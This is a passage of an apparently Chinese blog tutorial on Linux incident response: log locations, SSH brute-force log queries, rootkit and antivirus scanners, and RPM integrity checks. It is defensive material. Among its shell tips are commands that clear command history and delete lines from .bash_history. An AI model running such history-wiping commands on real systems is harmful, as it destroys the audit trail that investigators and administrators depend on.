+</code></pre>
+<p>第三种修改方法：</p>
+<p>使用 ntsysv 命令管理自启动，可以管理独立服务和 xinetd 服务。</p>
+<p><strong>入侵排查</strong></p>
+<p>1、查询已安装的服务：</p>
+<p>RPM 包安装的服务</p>
+<pre><code>chkconfig  --list  查看服务自启动状态，可以看到所有的RPM包安装的服务
+ps aux | grep crond 查看当前服务
+
+系统在3与5级别下的启动项 
+中文环境
+chkconfig --list | grep &quot;3:启用\|5:启用&quot;
+英文环境
+chkconfig --list | grep &quot;3:on\|5:on&quot;
+</code></pre>
+<p>源码包安装的服务</p>
+<pre><code>查看服务安装位置 ，一般是在/user/local/
+service httpd start
+搜索/etc/rc.d/init.d/  查看是否存在
+</code></pre>
+<h5 id="1-8-检查异常文件"><a href="#1-8-检查异常文件" class="headerlink" title="1.8 检查异常文件"></a>1.8 检查异常文件</h5><p>1、查看敏感目录，如&#x2F;tmp目录下的文件，同时注意隐藏文件夹，以“..”为名的文件夹具有隐藏属性</p>
+<p>2、得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？</p>
+<p>​	可以使用find命令来查找，如  find &#x2F;opt -iname “*” -atime 1 -type f 找出 &#x2F;opt 下一天前访问过的文件</p>
+<p>3、针对可疑文件可以使用 stat 进行创建修改时间。</p>
+<h5 id="1-9-检查系统日志"><a href="#1-9-检查系统日志" class="headerlink" title="1.9 检查系统日志"></a>1.9 检查系统日志</h5><p>日志默认存放位置：&#x2F;var&#x2F;log&#x2F;</p>
+<p>查看日志配置情况：more &#x2F;etc&#x2F;rsyslog.conf</p>
+<table>
+<thead>
+<tr>
+<th align="center">日志文件</th>
+<th align="center">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">&#x2F;var&#x2F;log&#x2F;cron</td>
+<td align="center">记录了系统定时任务相关的日志</td>
+</tr>
+<tr>
+<td align="center">&#x2F;var&#x2F;log&#x2F;cups</td>
+<td align="center">记录打印信息的日志</td>
+</tr>
+<tr>
+<td align="center">&#x2F;var&#x2F;log&#x2F;dmesg</td>
+<td align="center">记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td>
+</tr>
+<tr>
+<td align="center">&#x2F;var&#x2F;log&#x2F;mailog</td>
+<td align="center">记录邮件信息</td>
+</tr>
+<tr>
+<td align="center">&#x2F;var&#x2F;log&#x2F;message</td>
+<td align="center">记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件</td>
+</tr>
+<tr>
+<td align="center">&#x2F;var&#x2F;log&#x2F;btmp</td>
+<td align="center">记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td>
+</tr>
+<tr>
+<td align="center">&#x2F;var&#x2F;log&#x2F;lastlog</td>
+<td align="center">记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看</td>
+</tr>
+<tr>
+<td align="center">&#x2F;var&#x2F;log&#x2F;wtmp</td>
+<td align="center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</td>
+</tr>
+<tr>
+<td align="center">&#x2F;var&#x2F;log&#x2F;utmp</td>
+<td align="center">记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</td>
+</tr>
+<tr>
+<td align="center">&#x2F;var&#x2F;log&#x2F;secure</td>
+<td align="center">记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td>
+</tr>
+</tbody></table>
+<p>日志分析技巧：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">1、定位有多少IP在爆破主机的root帐号：    </span><br><span class="line">grep &quot;Failed password for root&quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">定位有哪些IP在爆破：</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br><span class="line"></span><br><span class="line">爆破用户名字典是什么？</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;|uniq -c|sort -nr</span><br><span class="line"> </span><br><span class="line">2、登录成功的IP有哪些： 	</span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">登录成功的日期、用户名、IP：</span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27; </span><br><span class="line"></span><br><span class="line">3、增加一个用户kali日志：</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali</span><br><span class="line">, shell=/bin/bash</span><br><span class="line">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali</span><br><span class="line">#grep &quot;useradd&quot; /var/log/secure </span><br><span class="line"></span><br><span class="line">4、删除用户kali日志：</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: delete user &#x27;kali&#x27;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed group &#x27;kali&#x27; owned by &#x27;kali&#x27;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed shadow group &#x27;kali&#x27; owned by &#x27;kali&#x27;</span><br><span class="line"># grep &quot;userdel&quot; /var/log/secure</span><br><span class="line"></span><br><span class="line">5、su切换用户：</span><br><span class="line">Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0)</span><br><span class="line"></span><br><span class="line">sudo授权执行:</span><br><span class="line">sudo -l</span><br><span class="line">Jul 10 00:43:09 localhost sudo:    good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x02-工具篇"><a href="#0x02-工具篇" class="headerlink" title="0x02 工具篇"></a>0x02 工具篇</h4><h5 id="2-1-Rootkit查杀"><a href="#2-1-Rootkit查杀" class="headerlink" title="2.1 Rootkit查杀"></a>2.1 Rootkit查杀</h5><ul>
+<li><p>chkrootkit  </p>
+<p>网址：<a target="_blank" rel="noopener" href="http://www.chkrootkit.org/">http://www.chkrootkit.org</a> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">使用方法：</span><br><span class="line">wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz</span><br><span class="line">tar zxvf chkrootkit.tar.gz</span><br><span class="line">cd chkrootkit-0.52</span><br><span class="line">make sense</span><br><span class="line">#编译完成没有报错的话执行检查</span><br><span class="line">./chkrootkit</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>rkhunter</p>
+<p>网址：<a target="_blank" rel="noopener" href="http://rkhunter.sourceforge.net/">http://rkhunter.sourceforge.net</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用方法：</span><br><span class="line">Wget https://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gz</span><br><span class="line">tar -zxvf rkhunter-1.4.4.tar.gz</span><br><span class="line">cd rkhunter-1.4.4</span><br><span class="line">./installer.sh --install</span><br><span class="line">rkhunter -c</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h5 id="2-2-病毒查杀"><a href="#2-2-病毒查杀" class="headerlink" title="2.2 病毒查杀"></a>2.2 病毒查杀</h5><ul>
+<li><p>Clamav</p>
+<p>网址：<a target="_blank" rel="noopener" href="http://www.clamav.net/download.html">http://www.clamav.net/download.html</a> </p>
+<p>安装方式一： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">1、安装 zlib：</span><br><span class="line">wget http://nchc.dl.sourceforge.net/project/libpng/zlib/1.2.7/zlib-1.2.7.tar.gz </span><br><span class="line">tar -zxvf  zlib-1.2.7.tar.gz</span><br><span class="line">cd zlib-1.2.7</span><br><span class="line">#安装一下gcc编译环境： yum install gcc</span><br><span class="line">CFLAGS=&quot;-O3 -fPIC&quot; ./configure --prefix= /usr/local/zlib/</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">2、添加用户组 clamav 和组成员 clamav：</span><br><span class="line">groupadd clamav</span><br><span class="line">useradd -g clamav -s /bin/false -c &quot;Clam AntiVirus&quot; clamav</span><br><span class="line"></span><br><span class="line">3、安装 Clamav</span><br><span class="line">tar –zxvf clamav-0.97.6.tar.gz</span><br><span class="line">cd clamav-0.97.6</span><br><span class="line">./configure --prefix=/opt/clamav --disable-clamav -with-zlib=/usr/local/zlib</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">4、配置 Clamav</span><br><span class="line">mkdir /opt/clamav/logs</span><br><span class="line">mkdir /opt/clamav/updata</span><br><span class="line">touch /opt/clamav/logs/freshclam.log</span><br><span class="line">touch /opt/clamav/logs/clamd.log</span><br><span class="line">cd /opt/clamav/logs</span><br><span class="line">chown clamav:clamav clamd.log</span><br><span class="line">chown clamav:clamav freshclam.log</span><br><span class="line"></span><br><span class="line">5、ClamAV 使用：</span><br><span class="line"> /opt/clamav/bin/freshclam 升级病毒库</span><br><span class="line">./clamscan –h 查看相应的帮助信息</span><br><span class="line">./clamscan -r /home  扫描所有用户的主目录就使用</span><br><span class="line">./clamscan -r --bell -i /bin  扫描bin目录并且显示有问题的文件的扫描结果</span><br></pre></td></tr></table></figure>
+
+<p>安装方式二： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#安装</span><br><span class="line">yum install -y clamav</span><br><span class="line">#更新病毒库</span><br><span class="line">freshclam</span><br><span class="line">#扫描方法</span><br><span class="line">clamscan -r /etc --max-dir-recursion=5 -l /root/etcclamav.log</span><br><span class="line">clamscan -r /bin --max-dir-recursion=5 -l /root/binclamav.log</span><br><span class="line">clamscan -r /usr --max-dir-recursion=5 -l /root/usrclamav.log</span><br><span class="line">#扫描并杀毒</span><br><span class="line">clamscan -r  --remove  /usr/bin/bsd-port</span><br><span class="line">clamscan -r  --remove  /usr/bin/</span><br><span class="line">clamscan -r --remove  /usr/local/zabbix/sbin</span><br><span class="line">#查看日志发现</span><br><span class="line">cat /root/usrclamav.log |grep FOUND</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h5 id="2-3-webshell查杀"><a href="#2-3-webshell查杀" class="headerlink" title="2.3 webshell查杀"></a>2.3 webshell查杀</h5><p>Linux 版：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">河马 WebShell 查杀：http://www.shellpub.com</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-4-RPM-check-检查"><a href="#2-4-RPM-check-检查" class="headerlink" title="2.4 RPM check 检查"></a>2.4 RPM check 检查</h5><p>系统完整性可以通过rpm自带的-Va来校验检查所有的rpm软件包，查看哪些命令是否被替换了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./rpm -Va &gt; rpm.log</span><br></pre></td></tr></table></figure>
+
+<p>如果一切均校验正常将不会产生任何输出，如果有不一致的地方，就会显示出来，输出格式是8位长字符串，每个字符都用以表示文件与RPM数据库中一种属性的比较结果 ，如果是. (点) 则表示测试通过。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">验证内容中的8个信息的具体内容如下：</span><br><span class="line">		S         文件大小是否改变</span><br><span class="line">		M         文件的类型或文件的权限（rwx）是否被改变</span><br><span class="line">		5         文件MD5校验是否改变（可以看成文件内容是否改变）</span><br><span class="line">		D         设备中，从代码是否改变</span><br><span class="line">		L         文件路径是否改变</span><br><span class="line">		U         文件的属主（所有者）是否改变</span><br><span class="line">		G         文件的属组是否改变</span><br><span class="line">		T         文件的修改时间是否改变</span><br></pre></td></tr></table></figure>
+
+<p>如果命令被替换了，如果还原回来：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">文件提取还原案例：</span><br><span class="line">rpm  -qf /bin/ls  查询 ls 命令属于哪个软件包</span><br><span class="line">mv  /bin/ls /tmp  先把 ls 转移到 tmp 目录下，造成 ls 命令丢失的假象</span><br><span class="line">rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls 提取 rpm 包中 ls 命令到当前目录的 /bin/ls 下</span><br><span class="line">cp /root/bin/ls  /bin/ 把 ls 命令复制到 /bin/ 目录 修复文件丢失</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-5-Linux安全检查脚本"><a href="#2-5-Linux安全检查脚本" class="headerlink" title="2.5 Linux安全检查脚本"></a>2.5 Linux安全检查脚本</h5><p>Github 项目地址：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/grayddq/GScan">https://github.com/grayddq/GScan</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ppabc/security_check">https://github.com/ppabc/security_check</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/T0xst/linux">https://github.com/T0xst/linux</a></p>
+<h3 id="Linux日志分析"><a href="#Linux日志分析" class="headerlink" title="Linux日志分析"></a>Linux日志分析</h3><h4 id="0x00-前言-1"><a href="#0x00-前言-1" class="headerlink" title="0x00 前言"></a>0x00 前言</h4><p>Linux系统拥有非常灵活和强大的日志功能，可以保存几乎所有的操作记录，并可以从中检索出我们需要的信息。 本文简介一下Linux系统日志及日志分析技巧。</p>
+<h4 id="0x01-日志简介"><a href="#0x01-日志简介" class="headerlink" title="0x01 日志简介"></a>0x01 日志简介</h4><p>日志默认存放位置：&#x2F;var&#x2F;log&#x2F;</p>
+<p>查看日志配置情况：more &#x2F;etc&#x2F;rsyslog.conf</p>
+<table>
+<thead>
+<tr>
+<th align="center">日志文件</th>
+<th align="center">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">&#x2F;var&#x2F;log&#x2F;cron</td>
+<td align="center">记录了系统定时任务相关的日志</td>
+</tr>
+<tr>
+<td align="center">&#x2F;var&#x2F;log&#x2F;cups</td>
+<td align="center">记录打印信息的日志</td>
+</tr>
+<tr>
+<td align="center">&#x2F;var&#x2F;log&#x2F;dmesg</td>
+<td align="center">记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td>
+</tr>
+<tr>
+<td align="center">&#x2F;var&#x2F;log&#x2F;mailog</td>
+<td align="center">记录邮件信息</td>
+</tr>
+<tr>
+<td align="center">&#x2F;var&#x2F;log&#x2F;message</td>
+<td align="center">记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件</td>
+</tr>
+<tr>
+<td align="center">&#x2F;var&#x2F;log&#x2F;btmp</td>
+<td align="center">记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td>
+</tr>
+<tr>
+<td align="center">&#x2F;var&#x2F;log&#x2F;lastlog</td>
+<td align="center">记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看</td>
+</tr>
+<tr>
+<td align="center">&#x2F;var&#x2F;log&#x2F;wtmp</td>
+<td align="center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</td>
+</tr>
+<tr>
+<td align="center">&#x2F;var&#x2F;log&#x2F;utmp</td>
+<td align="center">记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</td>
+</tr>
+<tr>
+<td align="center">&#x2F;var&#x2F;log&#x2F;secure</td>
+<td align="center">记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td>
+</tr>
+</tbody></table>
+<p>比较重要的几个日志：<br>	登录失败记录：&#x2F;var&#x2F;log&#x2F;btmp     &#x2F;&#x2F;lastb<br>	最后一次登录：&#x2F;var&#x2F;log&#x2F;lastlog  &#x2F;&#x2F;lastlog<br>	登录成功记录: &#x2F;var&#x2F;log&#x2F;wtmp     &#x2F;&#x2F;last<br>	登录日志记录：&#x2F;var&#x2F;log&#x2F;secure   </p>
+<p>​	目前登录用户信息：&#x2F;var&#x2F;run&#x2F;utmp  &#x2F;&#x2F;w、who、users</p>
+<p>​	历史命令记录：history<br>​	仅清理当前用户： history -c</p>
+<h4 id="0x02-日志分析技巧"><a href="#0x02-日志分析技巧" class="headerlink" title="0x02 日志分析技巧"></a>0x02 日志分析技巧</h4><h5 id="A、常用的shell命令"><a href="#A、常用的shell命令" class="headerlink" title="A、常用的shell命令"></a>A、常用的shell命令</h5><p>Linux下常用的shell命令如：find、grep 、egrep、awk、sed</p>
+<p>小技巧：</p>
+<p>1、grep显示前后几行信息:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">	标准unix/linux下的grep通过下面參数控制上下文：</span><br><span class="line">​	grep -C 5 foo file 显示file文件里匹配foo字串那行以及上下5行</span><br><span class="line">​	grep -B 5 foo file 显示foo及前5行</span><br><span class="line">​	grep -A 5 foo file 显示foo及后5行</span><br><span class="line">​	查看grep版本号的方法是</span><br><span class="line">​	grep -V</span><br></pre></td></tr></table></figure>
+
+<p>2、grep 查找含有某字符串的所有文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">grep -rn &quot;hello,world!&quot; </span><br><span class="line">* : 表示当前目录所有文件，也可以是某个文件名</span><br><span class="line">-r 是递归查找</span><br><span class="line">-n 是显示行号</span><br><span class="line">-R 查找所有文件包含子目录</span><br><span class="line">-i 忽略大小写</span><br></pre></td></tr></table></figure>
+
+<p>3、如何显示一个文件的某几行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat input_file | tail -n +1000 | head -n 2000</span><br><span class="line">#从第1000行开始，显示2000行。即显示1000~2999行</span><br></pre></td></tr></table></figure>
+
+
+<p>4、find &#x2F;etc -name init </p>
+<pre><code>//在目录/etc中查找文件init
+</code></pre>
+<p>5、只是显示&#x2F;etc&#x2F;passwd的账户</p>
+<pre><code>`cat /etc/passwd |awk  -F &#39;:&#39;  &#39;&#123;print $1&#125;&#39;`  
+//awk -F指定域分隔符为&#39;:&#39;，将记录按指定的域分隔符划分域，填充域，​$0则表示所有域,$1表示第一个域,​$n表示第n个域。
+</code></pre>
+<p>6、sed -i ‘153,$d’ .bash_history</p>
+<pre><code>删除历史操作记录，只保留前153行
+</code></pre>
+<h5 id="B、日志分析技巧"><a href="#B、日志分析技巧" class="headerlink" title="B、日志分析技巧"></a>B、日志分析技巧</h5><p><strong>A、&#x2F;var&#x2F;log&#x2F;secure</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">1、定位有多少IP在爆破主机的root帐号：    </span><br><span class="line">grep &quot;Failed password for root&quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">定位有哪些IP在爆破：</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br><span class="line"></span><br><span class="line">爆破用户名字典是什么？</span><br><span class="line"> grep &quot;Failed password&quot; /var/log/secure|perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;|uniq -c|sort -nr</span><br><span class="line"> </span><br><span class="line">2、登录成功的IP有哪些： 	</span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">登录成功的日期、用户名、IP：</span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27; </span><br><span class="line"></span><br><span class="line">3、增加一个用户kali日志：</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali</span><br><span class="line">, shell=/bin/bash</span><br><span class="line">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali</span><br><span class="line">#grep &quot;useradd&quot; /var/log/secure </span><br><span class="line"></span><br><span class="line">4、删除用户kali日志：</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: delete user &#x27;kali&#x27;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed group &#x27;kali&#x27; owned by &#x27;kali&#x27;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed shadow group &#x27;kali&#x27; owned by &#x27;kali&#x27;</span><br><span class="line"># grep &quot;userdel&quot; /var/log/secure</span><br><span class="line"></span><br><span class="line">5、su切换用户：</span><br><span class="line">Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0)</span><br><span class="line"></span><br><span class="line">sudo授权执行:</span><br><span class="line">sudo -l</span><br><span class="line">Jul 10 00:43:09 localhost sudo:    good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now</span><br></pre></td></tr></table></figure>
+
+<p><strong>2、&#x2F;var&#x2F;log&#x2F;yum.log</strong></p>
+<p>软件安装升级卸载日志：</p>
+<figure class="highlight plaintext"><figcaption><span>install gcc</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">yum install gcc</span><br><span class="line"></span><br><span class="line">[root@bogon ~]# more /var/log/yum.log</span><br><span class="line"></span><br><span class="line">Jul 10 00:18:23 Updated: cpp-4.8.5-28.el7_5.1.x86_64</span><br><span class="line">Jul 10 00:18:24 Updated: libgcc-4.8.5-28.el7_5.1.x86_64</span><br><span class="line">Jul 10 00:18:24 Updated: libgomp-4.8.5-28.el7_5.1.x86_64</span><br><span class="line">Jul 10 00:18:28 Updated: gcc-4.8.5-28.el7_5.1.x86_64</span><br><span class="line">Jul 10 00:18:28 Updated: libgcc-4.8.5-28.el7_5.1.i686</span><br></pre></td></tr></table></figure>
+
+<h3 id="Web日志分析"><a href="#Web日志分析" class="headerlink" title="Web日志分析"></a>Web日志分析</h3><h4 id="0x01-Web日志"><a href="#0x01-Web日志" class="headerlink" title="0x01  Web日志"></a>0x01  Web日志</h4><p>Web访问日志记录了Web服务器接收处理请求及运行时错误等各种原始信息。通过对WEB日志进行的安全分析，不仅可以帮助我们定位攻击者，还可以帮助我们还原攻击路径，找到网站存在的安全漏洞并进行修复。</p>
+<p>我们来看一条Apache的访问日志：</p>
+<p><code>127.0.0.1 - - [11/Jun/2018:12:47:22 +0800] &quot;GET /login.html HTTP/1.1&quot; 200 786 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36&quot;</code></p>
+<p>通过这条Web访问日志，我们可以清楚的得知用户在什么IP、什么时间、用什么操作系统、什么浏览器的情况下访问了你网站的哪个页面，是否访问成功。</p>
+<p>本文通过介绍Web日志安全分析时的思路和常用的一些技巧。</p>
+<h4 id="0x02-日志分析技巧-1"><a href="#0x02-日志分析技巧-1" class="headerlink" title="0x02 日志分析技巧"></a>0x02 日志分析技巧</h4><p>在对WEB日志进行安全分析时，一般可以按照两种思路展开，逐步深入，还原整个攻击过程。</p>
+<p>第一种：确定入侵的时间范围，以此为线索，查找这个时间范围内可疑的日志，进一步排查，最终确定攻击者，还原攻击过程。</p>
+<p>第二种：攻击者在入侵网站后，通常会留下后门维持权限，以方便再次访问，我们可以找到该文件，并以此为线索来展开分析。</p>
+<p>常用分析工具：</p>
+<p>Window下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。</p>
+<p>Linux下，使用Shell命令组合查询分析。</p>
+<p>Shell+Linux命令实现日志分析，一般结合grep、awk等命令等实现了几个常用的日志分析统计技巧。</p>
+<p>Apache日志分析技巧：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1、列出当天访问次数最多的IP命令：</span><br><span class="line">cut -d- -f 1 log_file|uniq -c | sort -rn | head -20</span><br><span class="line"></span><br><span 